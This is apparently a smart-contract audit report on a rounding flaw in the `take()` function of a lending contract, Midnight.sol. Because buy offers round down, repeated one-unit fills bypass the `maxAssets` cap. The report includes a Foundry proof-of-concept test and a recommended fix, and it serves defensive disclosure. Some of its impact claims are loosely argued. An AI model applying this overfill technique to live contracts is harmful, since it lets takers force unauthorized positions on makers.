### Title
Consumed-offer accounting uses `mulDivDown` for buy-offer `buyerAssets`, allowing cumulative rounding to bypass `maxAssets` cap and overfill the offer - (`src/Midnight.sol`)

### Summary
In `take()`, when `offer.buy == true` and `offer.maxAssets > 0`, the consumed tracking increments by `units.mulDivDown(buyerPrice, WAD)`. Because this rounds down, a taker can choose `units` small enough that `buyerAssets == 0` on every call, leaving `consumed` permanently at zero and allowing the offer to be filled an unbounded number of times regardless of `maxAssets`. The protocol's own NatSpec and an existing test named `testBugBuyMaxAssetsBypass` confirm this is a known, reproducible defect.

### Finding Description

**Code path** — `src/Midnight.sol` lines 358–369:

```
uint256 offerPrice = TickLib.tickToPrice(offer.tick);
// For offer.buy: sellerPrice = offerPrice - fee, buyerPrice = offerPrice
uint256 buyerAssets = offer.buy
    ? units.mulDivDown(buyerPrice, WAD)   // ← rounds DOWN
    : units.mulDivUp(buyerPrice, WAD);

if (offer.maxAssets > 0) {
    newConsumed = consumed[offer.maker][offer.group] += offer.buy
        ? buyerAssets   // ← increments by the rounded-down value
        : sellerAssets;
    require(newConsumed <= offer.maxAssets, ConsumedAssets());
}
``` [1](#0-0) 

**Root cause** — `mulDivDown` truncates. For a buy offer, `buyerPrice == offerPrice` (the settlement fee cancels out). Whenever `units * offerPrice < WAD`, `buyerAssets == 0`. The `consumed` mapping is not incremented, so the `require(newConsumed <= offer.maxAssets)` check is trivially satisfied on every call.

**Attacker inputs** — Any unprivileged taker. Preconditions:
- A buy offer exists with `offer.buy == true`, `offer.maxAssets > 0`, and `offerPrice < WAD` (i.e., `tick < MAX_TICK`; any tick below the maximum satisfies this for small enough `units`).
- The taker calls `take()` repeatedly with `units = 1` (or any value where `units * offerPrice < WAD`).

**Why existing checks fail** — The only guard is `require(newConsumed <= offer.maxAssets)`. Because `buyerAssets == 0` on each call, `newConsumed` never advances past its starting value. No other check bounds the number of fills or the total units transferred.

**Protocol acknowledgement** — The NatSpec at line 94 states: *"It is possible to give units to a fully consumed assets-based buy offer with price < 1."* The test `testBugBuyMaxAssetsBypass` (lines 858–888) pre-fills `consumed` to `maxAssets`, then calls `take(1, ...)` and asserts that `creditOf`, `debtOf`, and `totalUnits` all increase while `consumed` stays at `maxAssets` and no tokens move. [2](#0-1) [3](#0-2) 

### Impact Explanation

The maker's `maxAssets` cap is completely bypassed. A taker can call `take()` N times with `units = 1`, accumulating N units of credit for the maker and N units of debt for themselves, while `consumed` remains at 0 (or any prior value). The maker ends up with an arbitrarily large credit position they did not authorize. The invariant *"offers cannot be replayed, overfilled, reused, or filled after cancel/deadline"* is violated. The overfill is unbounded (not merely N−1) when `offerPrice < WAD` and `units` is chosen so that `units * offerPrice < WAD`.

### Likelihood Explanation

- Requires `offerPrice < WAD`, which is true for every tick below `MAX_TICK` — the common case for any market with a discount.
- Requires `units` small enough that `units * offerPrice < WAD`. For WBTC (8 decimals), `offerPrice` values in the range `[1, 1e10)` make `units = 1` sufficient.
- No special privilege, no oracle manipulation, no token owner action needed. Any taker can execute this against any qualifying buy offer.
- Repeatable indefinitely within a single transaction via multicall or across multiple transactions.

### Recommendation

Track consumed in **units** rather than assets when `maxAssets > 0` for buy offers, or convert `maxAssets` to a units ceiling once at offer creation. Alternatively, accumulate the rounding remainder and carry it forward so that the sum of rounded values equals the floor of the true sum. The simplest correct fix is to use `mulDivUp` (rounding against the taker) when computing the consumed increment for buy offers, consistent with how sell offers already use `mulDivUp` for `sellerAssets`. This ensures each fill charges at least as many assets as the fractional amount, preventing cumulative undercounting.

### Proof of Concept

```solidity
// Foundry stateful fuzz test
function testFuzz_BuyOfferOverfill(uint256 N) public {
    N = bound(N, 2, 1000);

    // Buy offer: lender is maker/buyer, offerPrice < WAD (tick < MAX_TICK)
    lenderOffer.buy = true;
    lenderOffer.maxUnits = 0;
    lenderOffer.maxAssets = 10; // 10 satoshis of WBTC
    lenderOffer.tick = MAX_TICK - 16; // offerPrice < WAD

    collateralize(market, borrower, N + 10);
    deal(address(loanToken), lender, 0);

    uint256 totalUnitsFilled;
    for (uint256 i; i < N; i++) {
        take(1, borrower, lenderOffer); // units = 1 each time
        totalUnitsFilled += 1;
    }

    uint256 offerPrice = TickLib.tickToPrice(lenderOffer.tick);
    uint256 maxUnitsAllowed = lenderOffer.maxAssets * WAD / offerPrice;

    // consumed stays at 0 (or initial value), never reaches maxAssets
    assertEq(midnight.consumed(lender, lenderOffer.group), 0);
    // total units filled far exceeds the intended cap
    assertGt(totalUnitsFilled, maxUnitsAllowed);
    // maker has N units of credit, paid 0 assets — offer overfilled
    assertEq(midnight.creditOf(id, lender), N);
}
```

Expected: `totalUnitsFilled == N` while `maxUnitsAllowed == 0` (since `1 * offerPrice < WAD`), demonstrating unbounded overfill. The assertion `assertEq(consumed, 0)` passes, confirming the cap is never enforced. [4](#0-3) [5](#0-4)

### Citations

**File:** src/Midnight.sol (L93-94)
```text
/// @dev Midnight can call the callback of offers through a no-op take, even if those offers have consumed==max.
/// @dev It is possible to give units to a fully consumed assets-based buy offer with price < 1.
```

**File:** src/Midnight.sol (L361-369)
```text
        uint256 sellerPrice = offer.buy ? offerPrice - _settlementFee : offerPrice;
        uint256 buyerPrice = sellerPrice + _settlementFee;
        uint256 buyerAssets = offer.buy ? units.mulDivDown(buyerPrice, WAD) : units.mulDivUp(buyerPrice, WAD);
        uint256 sellerAssets = offer.buy ? units.mulDivDown(sellerPrice, WAD) : units.mulDivUp(sellerPrice, WAD);

        uint256 newConsumed;
        if (offer.maxAssets > 0) {
            newConsumed = consumed[offer.maker][offer.group] += offer.buy ? buyerAssets : sellerAssets;
            require(newConsumed <= offer.maxAssets, ConsumedAssets());
```

**File:** test/TakeTest.sol (L857-889)
```text
    // Show that a buy offer with offerPrice < WAD can be taken with units > 0
    function testBugBuyMaxAssetsBypass() public {
        deal(address(loanToken), lender, 0); // lender pays 0
        collateralize(market, borrower, 100);

        lenderOffer.maxUnits = 0;
        lenderOffer.maxAssets = 1;
        lenderOffer.tick = MAX_TICK - 16; // offerPrice < WAD

        // Fully consume the offer before the take.
        vm.prank(lender);
        midnight.setConsumed(lenderOffer.group, lenderOffer.maxAssets, lender);

        uint256 lenderCreditBefore = midnight.creditOf(id, lender);
        uint256 borrowerDebtBefore = midnight.debtOf(id, borrower);
        uint256 totalUnitsBefore = midnight.totalUnits(id);
        uint256 lenderBalBefore = loanToken.balanceOf(lender);
        uint256 borrowerBalBefore = loanToken.balanceOf(borrower);

        (uint256 buyerAssets, uint256 sellerAssets) = take(1, borrower, lenderOffer);

        assertEq(buyerAssets, 0);
        assertEq(sellerAssets, 0);

        // Nothing observable to the cap or token balances changed:
        assertEq(midnight.consumed(lender, lenderOffer.group), lenderOffer.maxAssets);
        assertEq(loanToken.balanceOf(lender), lenderBalBefore);
        assertEq(loanToken.balanceOf(borrower), borrowerBalBefore);
        // But position state strictly changed:
        assertGt(midnight.creditOf(id, lender), lenderCreditBefore);
        assertGt(midnight.debtOf(id, borrower), borrowerDebtBefore);
        assertGt(midnight.totalUnits(id), totalUnitsBefore);
    }
```
